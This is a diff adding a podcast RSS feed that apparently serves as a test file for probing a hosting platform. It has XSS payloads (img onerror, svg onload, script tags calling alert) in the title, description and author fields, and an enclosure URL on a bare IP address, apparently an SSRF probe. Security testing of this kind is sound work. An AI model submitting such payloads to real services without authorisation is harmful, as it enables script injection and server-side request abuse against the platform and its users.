@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel>
+<title>XSS Test "&gt;&lt;img src=x onerror=alert(1)&gt; Podcast</title>
+<description>&lt;svg onload=alert(2)&gt;</description>
+<link>https://example.com/podcast</link>
+<language>en-us</language>
+<itunes:author>&lt;script&gt;alert(3)&lt;/script&gt;</itunes:author>
+<itunes:category text="Arts"/>
+<item>
+<title>&lt;img src=x onerror=alert(4)&gt;</title>
+<description>&lt;svg/onload=alert(5)&gt;</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/xss1</guid>
+<pubDate>Thu, 06 Nov 2026 02:40:00 GMT</pubDate>
+<enclosure url="http://129.226.203.245/episode.mp3" length="1024" type="audio/mpeg"/>
+</item>
+</channel>
+</rss>
